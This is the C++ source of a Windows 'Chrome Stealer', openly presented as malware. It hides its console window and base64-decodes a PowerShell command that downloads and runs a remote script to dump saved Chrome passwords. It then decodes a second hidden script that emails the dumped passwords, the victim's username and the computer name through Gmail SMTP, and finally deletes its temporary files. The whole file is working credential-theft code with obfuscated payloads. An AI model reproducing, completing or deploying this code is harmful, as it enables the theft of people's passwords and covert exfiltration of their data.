// Stealer.cpp - A simple Chrome Stealer
// You are allowed to reasearch this, If you copy, Don't forget to give me credit! I respect you for that!
// Enjoy :D

#include "base64.h"
#include <algorithm>
#include <windows.h>
#include <string>
#include <sstream>
#include <fstream>

#define UNLEN 256

std::string EMAIL = "";
std::string PASSWORD = "";
std::string MSGBOX = "";

std::string ExecuteOutFile(const char* command, const char* output_filename);
std::string readFileContents(const char* file);
std::string MyLocation();
std::string getInfo();
std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos);
std::string getLastLine(std::ifstream& in);
std::string UserPC();
BOOL isFile(const char* file);
bool SendMail();
void replaceAll( std::string &s, const std::string &search, const std::string &replace );
void split(char* src, char* dest[5], const char* delimeter);

void split(char* src, char* dest[5], const char* delimeter) {
	int i = 0;
	char *p = strtok(src, delimeter);
	while (p != NULL)
	{
		dest[i++] = p;
		p = strtok(NULL, delimeter);
	}
}

BOOL isFile(const char* file)
{
	DWORD dwAttrib = GetFileAttributes(file);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
			!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void replaceAll( std::string &s, const std::string &search, const std::string &replace ) {
	for( size_t pos = 0; ; pos += replace.length() ) {
		// Locate the substring to replace
		pos = s.find( search, pos );
		if( pos == std::string::npos ) break;
		// Replace by erasing and inserting
		s.erase( pos, search.length() );
		s.insert( pos, replace );
	}
}

std::string readFileContents(const char* file){
	std::stringstream stream;
	std::ifstream outfile(file);
	if(outfile.is_open()){
		stream << outfile.rdbuf();
		return stream.str();
	} else {
		stream << file << " not found : " << GetLastError();
		return stream.str();
	}
}

std::string MyLocation()
{
	TCHAR DIR[MAX_PATH];
	std::string filelocation;
	std::ostringstream err;
	int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath == 0)
	{
		err.str(""); err.clear();
		err << "Failed to get : " << GetLastError();
		filelocation = err.str();
	}
	else {
		filelocation = DIR;
	}

	return filelocation;

}

std::string DumpChromeCredentials()
{
	std::ofstream ifError;
	std::string Payload = "ImlleCAoaXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9xdWFudHVtY29yZS90ZXN0L21hc3Rlci9vcnBoaWMucHMxKSB8IENvbnZlcnRUby1Dc3Y7Ig==";
	std::string b64decode = base64_decode(Payload);
	ExecuteOutFile(b64decode.c_str(), "orphic_meta");
	
	if(readFileContents("orphic_meta").find("FullyQualifiedErrorId") != std::string::npos)
	{
		ifError.open("orphic_meta", std::ofstream::out | std::ofstream::trunc);
		if(ifError.is_open()){
			ifError << "No Passwords found / Chrome not installed." << std::endl;
			ifError.close();
		}
	} 
	
	return readFileContents("orphic_meta");
	
}

std::string ExecuteOutFile(const char* command, const char* output_filename)
{
	char cmd[500];
	memset(cmd, '\0', 500);
	snprintf(cmd, 500, "cmd.exe /c powershell.exe -command %s > %s", command, output_filename);
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	if(CreateProcess(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
	return readFileContents(output_filename);
}





std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos)
{
	pos = in.tellg();
	return in.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
}

std::string getLastLine(std::ifstream& in)
{
	std::ifstream::pos_type pos = in.tellg();

	std::ifstream::pos_type lastPos;
	while (in >> std::ws && ignoreline(in, lastPos))
		pos = lastPos;

	in.clear();
	in.seekg(pos);

	std::string line;
	std::getline(in, line);
	return line;

}


std::string getInfo()
{
	char* values[5];
	std::ifstream ME(MyLocation().c_str(), std::ios::binary);
	if(ME.is_open()){
		std::string hp = getLastLine(ME);
		memset(values, '\0', 5);
		split((char*)hp.c_str(), values, "-");
        EMAIL = values[0];
        PASSWORD = values[1];
        MSGBOX = values[2];
	}
}

std::string UserPC()
{
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	std::string userpc;
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	userpc = std::string(username) + " / " + std::string(hostname);
	return userpc;
}


bool SendMail()
{
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	std::ofstream outscript;
	std::string powershell_script = "JFVzZXJuYW1lID0gImRlc3RpbmF0aW9uIjsKJFBhc3N3b3JkID0gImRwYXNzIjsKJG9tID0gImZzIjsKCgpmdW5jdGlvbiBTZW5kLVRvRW1haWwoW3N0cmluZ10kZW1haWwpewoKICAgICRtZXNzYWdlID0gbmV3LW9iamVjdCBOZXQuTWFpbC5NYWlsTWVzc2FnZTsKICAgICRtZXNzYWdlLkZyb20gPSAiZGVzdGluYXRpb24iOwogICAgJG1lc3NhZ2UuVG8uQWRkKCRlbWFpbCk7CiAgICAkbWVzc2FnZS5TdWJqZWN0ID0gImVtYWlsdGl0bGUiOwogICAgJG1lc3NhZ2UuQm9keSA9ICJlbWFpbG1lc3NhZ2UiOwogICAgJGF0dF9vbmUgPSBOZXctT2JqZWN0IE5ldC5NYWlsLkF0dGFjaG1lbnQoJG9tKTsKCiAgICAkbWVzc2FnZS5BdHRhY2htZW50cy5BZGQoJGF0dF9vbmUpOwogICAgJHNtdHAgPSBuZXctb2JqZWN0IE5ldC5NYWlsLlNtdHBDbGllbnQoInNlcnZlcmhvc3QiLCAiNTg3Iik7CiAgICAkc210cC5FbmFibGVTU0wgPSAkdHJ1ZTsKICAgICRzbXRwLkNyZWRlbnRpYWxzID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lk5ldHdvcmtDcmVkZW50aWFsKCRVc2VybmFtZSwgJFBhc3N3b3JkKTsKICAgICRzbXRwLnNlbmQoJG1lc3NhZ2UpOwogICAgJGF0dF9vbmUuZGlzcG9zZSgpOwoKIH0KU2VuZC1Ub0VtYWlsICAtZW1haWwgImRlc3RpbmF0aW9uIjs=";
	std::string pwdecode = base64_decode(powershell_script);
	replaceAll(pwdecode, "destination", EMAIL);
	replaceAll(pwdecode, "dpass", PASSWORD);
	replaceAll(pwdecode, "emailmessage", "Orphic META Chrome Passwords for "  + UserPC());
	replaceAll(pwdecode, "emailtitle", "OrphicMETA Report");
	replaceAll(pwdecode, "fs", "orphic_meta");
    replaceAll(pwdecode, "serverhost", "smtp.gmail.com");
	outscript.open("x.ps1");
	if(outscript.is_open())
	{
		outscript << pwdecode;
		outscript.close();
	}
	CreateProcess(NULL, (LPSTR)"cmd.exe /c powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -file x.ps1", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
	WaitForSingleObject(pinfo.hProcess, INFINITE);
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
}




int main()
{
	FreeConsole();
    getInfo();
    if(MSGBOX != "0")
    {
        MessageBoxA(NULL, MSGBOX.c_str(), "Message", MB_ICONINFORMATION);
    }
    DumpChromeCredentials();
    SendMail();
	remove("orphic_meta"); remove("x.ps1");
	exit(0);
	return 0;
}

